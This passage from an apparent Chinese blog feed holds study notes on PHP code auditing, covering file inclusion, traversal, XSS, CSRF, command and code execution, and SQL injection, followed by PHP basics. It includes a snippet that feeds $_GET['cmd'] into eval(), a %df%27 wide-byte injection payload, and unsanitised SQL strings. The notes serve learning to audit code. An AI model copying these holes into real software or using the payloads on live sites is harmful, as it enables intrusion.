仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。可以用在已经定义了一组合法的变量，然后要从一个数组例如$_REQUEST中提取值覆盖这些变量的场合。本标记是PHP4.2.0新加的。EXTR_PREFIX_IF_EXISTS-仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。本标记是PHP4.2.0新加的。EXTR_REFS-将变量作为引用提取。这有力地表明了导入的变量仍然引用了var_array 参数的值。可以单独使用这个标志或者在extract_type中用OR与其它任何标志结合使用。本标记是PHP4.3.0新加的。</code></pre><h2 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str()变量覆盖"></a>parse_str()变量覆盖</h2><pre><code>void parse_str ( string $encoded_string [, array &amp;$result] )$encoded_string 输入的字符串&amp;$result 变量将会以数组元素的形式存入到这个数组，作为替代</code></pre><h2 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h2><pre><code>bool import_request_variables ( string $type [, string $prefix ] )$type 指定需要导入的变量。可以用字母‘G&#39;、‘P&#39;和 ‘C‘分别表示GET、POST和Cookie$prefix 变量名前缀</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;变量覆盖&quot;&gt;&lt;a href=&quot;#变量覆盖&quot; class=&quot;headerlink&quot; title=&quot;变量覆盖&quot;&gt;&lt;/a&gt;变量覆盖&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day9</title>
    <link href="http://lingxin16.github.io/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/"/>
    <id>http://lingxin16.github.io/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/</id>
    <published>2020-03-25T13:49:57.000Z</published>
    <updated>2020-03-25T14:53:53.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2><a id="more"></a><p>服务端：</p><p>1.黑白名单过滤</p><p>2.修改MIME类型</p><p>3.截断上传攻击</p><p>4..htaccess文件攻击</p><p>5.目录验证</p><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>目录穿越(Directory Traversal)攻击是黑客能够在Web应用程序所在的根目录以外的文件夹上,任意地存取被限制的文件夹、执行命令或查找数据。目录穿越攻击,也有人称为Path Traversal攻击。</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>进行URL编码</p><p>进行16位Unicode编码</p><p>进行双倍URL编码</p><p>进行超长UTF-8 Unicode编码</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含漏洞的产生原因是在通过引入文件时,引用的文件名用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时,就形成的本地文件包含漏洞,被包涵的文件在第三方服务是,就形成了远程文件包含漏洞。</p><p>模块加载、cache调用,传入的参数拼接包含路径</p><p>include()<br>使用此函数,只有代码执行到此函数时才将文件包含进来,发生错误时只警告并继续执行。</p><p>inclue_once0<br>功能和前者一样,区别在于当重复调用同- -文件时,程序只调用一次。</p><p>require()<br>使用此函数,只要程序执行,立即调用此函数包含文件,发生错误时,会输出错误信息并<br>立即终止程序。</p><p>require_once()<br>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 </p><h3 id="远程包含利用方式"><a href="#远程包含利用方式" class="headerlink" title="远程包含利用方式"></a>远程包含利用方式</h3><p><img src="/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/QQ%E6%88%AA%E5%9B%BE20200325223345.jpg" alt="QQ截图20200325223345"></p><h2 id="任意文件读取及删除"><a href="#任意文件读取及删除" class="headerlink" title="任意文件读取及删除"></a>任意文件读取及删除</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p><img src="/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/QQ%E6%88%AA%E5%9B%BE20200325224125.jpg" alt="QQ截图20200325224125"></p><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>unlike()</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;文件上传绕过&quot;&gt;&lt;a href=&quot;#文件上传绕过&quot; class=&quot;headerlink&quot; title=&quot;文件上传绕过&quot;&gt;&lt;/a&gt;文件上传绕过&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day8</title>
    <link href="http://lingxin16.github.io/2020/03/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day8/"/>
    <id>http://lingxin16.github.io/2020/03/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day8/</id>
    <published>2020-03-24T14:14:53.000Z</published>
    <updated>2020-03-24T14:41:56.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><a id="more"></a><p>CSRF ( Cross-site request forgery )跨站请求伪造,也有人写出XSRF。黑客伪造用户的HTTP请求。然后将这个HTTP请求发送给存在CSRF的网站,有CSRF的网站执行了伪造的HTTP请求,就引发了跨站请求伪造</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CSRF漏洞&quot;&gt;&lt;a href=&quot;#CSRF漏洞&quot; class=&quot;headerlink&quot; title=&quot;CSRF漏洞&quot;&gt;&lt;/a&gt;CSRF漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day7</title>
    <link href="http://lingxin16.github.io/2020/03/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day7/"/>
    <id>http://lingxin16.github.io/2020/03/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day7/</id>
    <published>2020-03-23T13:23:41.000Z</published>
    <updated>2020-03-23T14:08:59.772Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><a id="more"></a><p>跨站脚本攻击( Cross Site Scripting )是指攻击者利用网站程序对用户输入过滤不足,输入可以显示在页面上对其他用户造成影响的HTML代码,从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表( Cascading Style Sheets )的缩写CSS区分开,跨站脚本攻击通常简写为XSS。</p><h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p>搜索内容</p><p>发表文章</p><p>评论回复</p><p>资料设置</p><p>留言</p><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><p>反射型</p><p>存储型</p><p>DOM型</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>​    非持久型,也叫反射型XSS。通过GET和POST方法,向服务器端输入数据。用户输入的数据通常被放置在URL的query string中,或者是form数据中。如果服务器端对输入的数据不进行过滤,验证或编码,就直接将用户输入的信息直接呈现给客户，则可能会造成反射型XSS。</p><p>​    反射型XSS是比较普遍的XSS ,其危害程度通常被认为较小。但是某些反射型XSS造成的后果会很严重,如在输入框的name中输入<meta http-equiv="refresh" content="5"> ,服务器不加处理,将name的值直接送到浏览器，则浏览器会每5秒自动刷新一次。严重者会导致服务器崩溃。</p><p>常见场景:<br>●将前端获取的内容,直接输出到浏览器页面<br>●将前端获取的内容,直接输出到HTML标签<br>●将前端获取的内容，直接输出到<script>标签</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>​    持久型,也叫存储型XSS,通常是因为服务器端将用户输入的恶意脚本没有通过验证就直接存储在数据库,并且每次通过调用数据库的方式,将数据呈现在浏览器上。则该XSS跨站脚本攻击将一直存在。若其他用户访问该页面,则恶意脚本就会被触发,用于盗取其他用户的私人信息。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>​    DOM ,全称Document Object Model ,是一个平台和语言都中立的接口,可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。<br>DOM型XSS其实是一种特殊类型的XSS ,它是基于DOM文档对象模型的一种漏洞。</p></script></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;XSS漏洞&quot;&gt;&lt;a href=&quot;#XSS漏洞&quot; class=&quot;headerlink&quot; title=&quot;XSS漏洞&quot;&gt;&lt;/a&gt;XSS漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day6</title>
    <link href="http://lingxin16.github.io/2020/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day6/"/>
    <id>http://lingxin16.github.io/2020/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day6/</id>
    <published>2020-03-22T13:40:26.000Z</published>
    <updated>2020-03-22T14:19:42.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><a id="more"></a><p>命令注入是一种攻击，目标是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单、cookie、HTTP头等）传递给系统shell时，命令注入攻击是可能的。在这种攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的特权执行。命令注入攻击可能很大程度上是由于输入验证不足。</p><h3 id="命令执行和代码执行的区别"><a href="#命令执行和代码执行的区别" class="headerlink" title="命令执行和代码执行的区别"></a>命令执行和代码执行的区别</h3><p>代码执行：执行的效果完全受限于语言本身</p><p>命令执行：执行的效果不受限于语言语法本身，不受命令本身限制</p><h3 id="命令执行类型："><a href="#命令执行类型：" class="headerlink" title="命令执行类型："></a>命令执行类型：</h3><blockquote><p>1.代码层过滤不严</p><p>2.系统漏洞</p><p>3.第三方组件存在代码执行漏洞</p></blockquote><p>常见函数：</p><p>system函数<br>passthru函数<br>Exec函数<br>Shell_exec函数<br>“</p><p>1.system函数</p><p>string system( string $command[,int &amp;$return_var] )</p><p>$command 要执行的命令</p><p>$return_var 如果提供此参数，则外部命令执行后的返回状态将会被设置到此变量中</p><p>2.passthru函数</p><p>string passthru ( string $command [, int &amp;$return_var] )</p><p>$command 要执行的命令</p><p>$return_var 如果提供此参数，Unix命令的返回状态会被记录到此参数</p><p>3.Exec函数</p><p>string exec ( string $command [,  array &amp;$output [, int &amp;$return var ]] )</p><p>$command 要执行的命令</p><p>$output 如果提供此参数，会有命令执行的输出填充此数组</p><p>$return_ var如果同时提供$output和$return_var参数，命令执行后的返回状态会被写入到此变量</p><p>4.Shell_exec函数</p><p>string shell_exec ( string $cmd )</p><p>$cmd 要执行的命令</p><p>反引号(`)则调用此函数</p><p>5.过滤函数</p><p>Escapeshellcmd() 过滤整条命令</p><p>Escapeshellarg() 过滤整个参数</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;命令执行漏洞&quot;&gt;&lt;a href=&quot;#命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;命令执行漏洞&quot;&gt;&lt;/a&gt;命令执行漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day5</title>
    <link href="http://lingxin16.github.io/2020/03/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day5/"/>
    <id>http://lingxin16.github.io/2020/03/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day5/</id>
    <published>2020-03-21T15:15:22.000Z</published>
    <updated>2020-03-21T15:58:00.820Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><a id="more"></a><p>代码执行漏洞是指应用程序本身过滤不严，用户可以通过请求将代码注入到应用中执行。当应用在调用一些能将字符串转化成代码的函数(如php中的eval)时，没有考虑到用户是否能控制这个字符串，将造成代码注入漏洞。狭义的代码注入通常指将可执行代码注入到当前页面中，如php的eval函数，可以将字符串代表的代码作为php代码执行，当前用户能够控制这段字符串时，将产生代码注入漏洞</p><h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><p>eval和assert<br>回调函数<br>动态执行函数<br>preg_replace函数</p><p>1.eval()、assert()将输入的字符串参数作为PHP程序代码来执行</p><p>2.回调函数mixed call_user_ func ( callable $callback [, mixed $parameter [, mixed $… ]])<br>$callback是要调用的自定义函数名称<br>$parameter是自定义函数的参数<br>常见的回调函数:<br>call_user_func()、call_user_func_array()、array_map()等</p><pre><code>&lt;?phpfunction callBack()[        $b = $_GET[&#39;cmd&#39;];        eval($b);]call_user_func(function&#39;callBack&#39;,$b);?&gt;</code></pre><p>3.动态执行函数</p><pre><code>1.定义一个函数2.将函数名(字符串)赋值给一个变量3.使用变量名代替函数名动态调用函数</code></pre><p>4.preg_replace</p><pre><code>mixed preg_replace ( mixed $pattern,mixed $replacement , mixed $subject [, int $limit =-1 [, int &amp;$count]])$pattern正则匹配的内容$replacement用于替换的字符串或字符串数组$subject要进行搜索和替换的字符串或字符串数组$pattern存在/e模式修正符修饰 允许代码执行</code></pre><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>正则表达式语法规则                         普通字符作为原子</p><p>限定符                                                特殊符号作为原子</p><p>边界限制符                                        通用字符类型作为原子</p><p>后向引用                                            自定义原子表作为原子</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;代码执行漏洞&quot;&gt;&lt;a href=&quot;#代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;代码执行漏洞&quot;&gt;&lt;/a&gt;代码执行漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day4</title>
    <link href="http://lingxin16.github.io/2020/03/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day4/"/>
    <id>http://lingxin16.github.io/2020/03/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day4/</id>
    <published>2020-03-20T14:22:05.000Z</published>
    <updated>2020-03-20T15:29:18.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><a id="more"></a><p>因为%df的关系, \的编码%5c被吃掉了,也就失去了转义的效果,直接被带入到mysql中,然后mysql在解读时无视了%a0%5c形成的新字节，那么单引号便重新发挥了效果</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p>%df%27===&gt; (addslashes)====&gt; %df%5c%27====&gt;(GBK)====&gt;運’<br>用户输入===&gt;过滤函数===&gt;代码层的$sql==&gt; mysql处理请求= =&gt;mysql中的sql<br>默认编码character set_ client== &gt;根据character. set connection转码== &gt;更新数据库时转化成字段<br>所对应的编码</p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案:"></a>修复方案:</h3><p>(1)使用mysql_set_charset(GBK)指定字符集<br>(2)使用mysql _real_escape_string进行转义</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>注入点因为经过过滤处理无法触发sql注入漏洞,比如addslashes函数,将单引号等字符转义变成,但是存进数据库后，数据又被还原，在这种情况下。如果发现一个新的注入同时引用了被插入的数据库数据，就可以实现闭合新发现的注入漏洞引发二次注入(先将注入语句插入到数据库中，然后再触发语句)</p><p>一阶注入:<br>1.一阶SQL注 入发生在一个HTTP请求和响应中 ,对系统的攻击是立即执行的<br>2.攻击者在http请求中提交非法输入<br>3.应用程序处理非法输入。使用非法输入构造SQL语句<br>4.在攻击过程中向攻击者返回结果<br>二阶注入:<br>1.攻击者在http请求中提交恶意输入<br>2.恶意输入保存在数据库中<br>3.攻击者提交第二次http请求<br>4.为处理第二次http请求,程序在检索存储在数据库中的恶意输入，构造SQL语句<br>5.如果攻击成功,在第二次请求响应中返回结果</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;宽字节注入&quot;&gt;&lt;a href=&quot;#宽字节注入&quot; class=&quot;headerlink&quot; title=&quot;宽字节注入&quot;&gt;&lt;/a&gt;宽字节注入&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day3</title>
    <link href="http://lingxin16.github.io/2020/03/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day3/"/>
    <id>http://lingxin16.github.io/2020/03/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day3/</id>
    <published>2020-03-19T14:38:28.000Z</published>
    <updated>2020-03-19T15:35:26.213Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码审计Sql注入漏洞"><a href="#代码审计Sql注入漏洞" class="headerlink" title="代码审计Sql注入漏洞"></a>代码审计Sql注入漏洞</h2><a id="more"></a><p>注入类型：数字型、字符型，这两种都包括以下几种注入</p><p>post注入、cookie注入、宽字节注入、二次注入、盲注、base64注入、探索注入</p><p>数字型：当输入的参数为整型时，则可认为是数字型注入</p><blockquote><p>$result = “select * from admin where id=$id”;</p></blockquote><p>不需要单引号来闭合</p><p>字符型：当输入的参数为字符串时，称之为字符型注入</p><blockquote><p>$result = “select * from admin where id=’$id’ ”;</p></blockquote><p>需要单引号来闭合</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;代码审计Sql注入漏洞&quot;&gt;&lt;a href=&quot;#代码审计Sql注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;代码审计Sql注入漏洞&quot;&gt;&lt;/a&gt;代码审计Sql注入漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day2</title>
    <link href="http://lingxin16.github.io/2020/03/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day2/"/>
    <id>http://lingxin16.github.io/2020/03/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day2/</id>
    <published>2020-03-18T13:32:37.000Z</published>
    <updated>2020-03-18T14:34:26.346Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h2><p>echo</p><p>​    最简单的输出数据调试方法，一般用来输出变量值或者不确定执行到哪个分支</p><a id="more"></a><p>print_r、var_dump、debug_zval_dump</p><p>​    输出变量的数据值，特别是数组和对象数据，一半在查看接口的返回值或者不确定的变量可以使用这两个api，debug_zval_dump输出结果和var_dump类似，位移增加的值是refcount，记录一个变量被引用了多少次</p><p>debug_print_backtrace</p><p>​    可以查看输出的调用栈信息</p><p>exit()</p><p>​    停止程序，无法运行后面代码</p><h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h2><p>全局变量</p><p>​    全局变量就是在函数外面定义的变量。不能在函数中直接使用。因为它的作用域不<br>会到函数内部。所以在函数内部使用的时候常常看到类似global $a;</p><p>超全局变量</p><p>​    超全局变量作用域在所有脚本都有效。所以,在函数可直接使用。比如$_ GET，<br>$. SERVER都是超全局变量。除$<em>GET, $. _POST,$</em> SERVER, $_ COOKIE等之外的超全局<br>变量保存在$GLOBALS数组中</p><pre><code>$GLOBALS$_REQUEST$_GET$_ENV$_SESSION$_SERVE$_POST$_FILES$_COOKIS</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;代码调试&quot;&gt;&lt;a href=&quot;#代码调试&quot; class=&quot;headerlink&quot; title=&quot;代码调试&quot;&gt;&lt;/a&gt;代码调试&lt;/h2&gt;&lt;p&gt;echo&lt;/p&gt;
&lt;p&gt;​    最简单的输出数据调试方法，一般用来输出变量值或者不确定执行到哪个分支&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day1</title>
    <link href="http://lingxin16.github.io/2020/03/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day1/"/>
    <id>http://lingxin16.github.io/2020/03/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day1/</id>
    <published>2020-03-17T13:48:33.000Z</published>
    <updated>2020-03-17T15:36:14.221Z</updated>
    
    <content type="html"><![CDATA[<h3 id="魔术引号自动过滤"><a href="#魔术引号自动过滤" class="headerlink" title="魔术引号自动过滤"></a>魔术引号自动过滤</h3><a id="more"></a><p>magic_quotes_gpc= on (在PHP5.4.0中被移除)</p><p>如果是开启状态，那么将自动对用户提交的sql语句进行转义</p><p>会把所有的单引号(“’’”)双引号(““””)反斜杠(”\“)和空字符(NULL)加上反斜杠进行转义</p><p>可以使用addslashes来转义提交的请求，或者用stripslashes来删除转义</p><h3 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h3><h4 id="是否允许包含远程文件"><a href="#是否允许包含远程文件" class="headerlink" title="是否允许包含远程文件"></a>是否允许包含远程文件</h4><p>allow_url_include= off</p><h4 id="是否允许打开远程文件"><a href="#是否允许打开远程文件" class="headerlink" title="是否允许打开远程文件"></a>是否允许打开远程文件</h4><p>allow_url_open= on</p><h3 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h3><h4 id="HTTP头部版本信息"><a href="#HTTP头部版本信息" class="headerlink" title="HTTP头部版本信息"></a>HTTP头部版本信息</h4><p>expose_php = off</p><p>防止通过http头部泄露php的版本信息</p><h4 id="文件上传临时目录"><a href="#文件上传临时目录" class="headerlink" title="文件上传临时目录"></a>文件上传临时目录</h4><p>upload_tmp_dir=</p><p>上传文件临时保存的目录，如果不设置的话，则采用系统的临时目录</p><h4 id="用户可访问目录"><a href="#用户可访问目录" class="headerlink" title="用户可访问目录"></a>用户可访问目录</h4><p>open_basedir = </p><p>能够控制PHP脚本只能访问指定目录</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;魔术引号自动过滤&quot;&gt;&lt;a href=&quot;#魔术引号自动过滤&quot; class=&quot;headerlink&quot; title=&quot;魔术引号自动过滤&quot;&gt;&lt;/a&gt;魔术引号自动过滤&lt;/h3&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>php学习day5</title>
    <link href="http://lingxin16.github.io/2020/03/16/php%E5%AD%A6%E4%B9%A0day5/"/>
    <id>http://lingxin16.github.io/2020/03/16/php%E5%AD%A6%E4%B9%A0day5/</id>
    <published>2020-03-16T12:54:41.000Z</published>
    <updated>2020-03-16T13:29:01.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><a id="more"></a><p>流程控制：代码执行的方向</p><h3 id="控制分类"><a href="#控制分类" class="headerlink" title="控制分类"></a>控制分类</h3><p>顺序结构：代码从上往下，顺序执行。（代码执行的最基本结构）</p><p>分支结构：给定一个条件，同时有多种可执行代码(块)，然后根据条件执行某一段代码</p><p>循环结构：在某个条件控制范围内，指定的代码(块)可以重复执行</p><h4 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h4><p>顺序结构:最基本结构，所有代码默认都是从上往下依次执行</p><h4 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h4><p>在PHP中，分支结构主要有两种: if 分支和switch分支</p><h5 id="if分支"><a href="#if分支" class="headerlink" title="if分支"></a>if分支</h5><p>最简if：</p><p>if(条件表达式){</p><p>​    //满足条件所要执行的内容；顺序结构</p><p>}</p><p>基础if</p><p>if(条件表达式){</p><p>​    //满足条件所要执行的内容；</p><p>}else{</p><p>​    //不满足条件所要执行的代码段</p><p>}</p><p>复杂if结构</p><p>if(条件表达式1){</p><p>​    //满足表达式1的代码段；</p><p>}elseif(条件表达式2){</p><p>​    //不满足表达式1的代码段，但是满足表达式2的代码段；</p><p>}    //可是使用多个elseif来判断</p><p>else{</p><p>​    //全部不满足要执行的代码</p><p>}</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;流程控制&quot;&gt;&lt;a href=&quot;#流程控制&quot; class=&quot;headerlink&quot; title=&quot;流程控制&quot;&gt;&lt;/a&gt;流程控制&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="php" scheme="http://lingxin16.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>php学习day4</title>
    <link href="http://lingxin16.github.io/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/"/>
    <id>http://lingxin16.github.io/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/</id>
    <published>2020-03-15T13:52:40.000Z</published>
    <updated>2020-03-15T14:59:58.060Z</updated>
    
    <content type="html"><![CDATA[<h2 id="计算机码"><a href="#计算机码" class="headerlink" title="计算机码"></a>计算机码</h2><a id="more"></a><p>计算机码：计算机在实际存储数据的时候，采用的编码规则（二进制规则）</p><p>计算机码：原码、反码和补码，数值本身最左边一位是符号位，正数为0，负数为1</p><p>原码：数据本身从十进制转换成二进制得到的结果</p><p>​        正数：左边符号位为0  (正数的原码、反码和补码就是原码本身)</p><p>​        负数：左边符号位为1</p><p>反码：针对负数，符号位不变，其他位取反(01转换)</p><p>补码：针对负数，反码+1</p><p>系统中存在两个0：+0和-0</p><p>+0:00000000</p><p>-0:10000000    原码</p><p>取反：11111111</p><p>补码：00000000</p><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><pre><code>位运算:取出计算机中最小的单位(位bit)进行运算&amp;：按位与，两个位都为1，结果为1，否则为0|：按位或，两个有一-个为1，结果为1~：按位非，一个位如果为1则变成0，否则反之^：按位异或，两个相同则为0,不同则为1&lt;&lt;：按位左移，整个位(32位), 向左移动一位，右边补0&gt;&gt;：按位右移，整个位向右移动一位，左边补符号位对应内容(正数补0，负数补1)</code></pre><p>计算机进行任何位运算时使用的是补码</p><p>运算结束之后都必须转换成原码才是最终要显示的数据</p><p>按位左移：乘以2的操作</p><p>按位右移：除以2的操作</p><h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p>运算符优先级:在多种运算符同时存在的时候，如何结合运算</p><p><img src="/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/QQ%E6%88%AA%E5%9B%BE20200315225044.jpg" alt="QQ截图20200315225044"></p><p><img src="/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/QQ%E6%88%AA%E5%9B%BE20200315225106.jpg" alt="QQ截图20200315225106"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;计算机码&quot;&gt;&lt;a href=&quot;#计算机码&quot; class=&quot;headerlink&quot; title=&quot;计算机码&quot;&gt;&lt;/a&gt;计算机码&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="php" scheme="http://lingxin16.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Python安装双版本</title>
    <link href="http://lingxin16.github.io/2020/03/15/Python%E5%AE%89%E8%A3%85%E5%8F%8C%E7%89%88%E6%9C%AC/"/>
    <id>http://lingxin16.github.io/2020/03/15/Python%E5%AE%89%E8%A3%85%E5%8F%8C%E7%89%88%E6%9C%AC/</id>
    <published>2020-03-15T09:37:56.000Z</published>
    <updated>2020-03-15T09:46:12.718Z</updated>
    
    <content type="html"><![CDATA[<p>Python的环境部署一直是有问题，今天就想个办法把这个问题解决了</p><p>同时安装Python2和Python3的版本并配置环境变量</p><a id="more"></a><p>在官网下载Python2和Python3的安装包</p><p>安装Python2和Python3的时候都勾选add to path(配置环境变量)</p><p>然后在Python2文件夹里把python.exe改为python2.exe</p><p>同理在scripts文件夹下把pip.exe分别改为pip2.exe</p><p>这个时候测试的话pip2 -V命令会报错</p><p>我们在官网下载pip安装包，cmd中cd命令进入安装文件</p><p>然后python2 setup.py install</p><p><img src="/2020/03/15/Python%E5%AE%89%E8%A3%85%E5%8F%8C%E7%89%88%E6%9C%AC/1.png" alt="1"></p><p>ok！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Python的环境部署一直是有问题，今天就想个办法把这个问题解决了&lt;/p&gt;
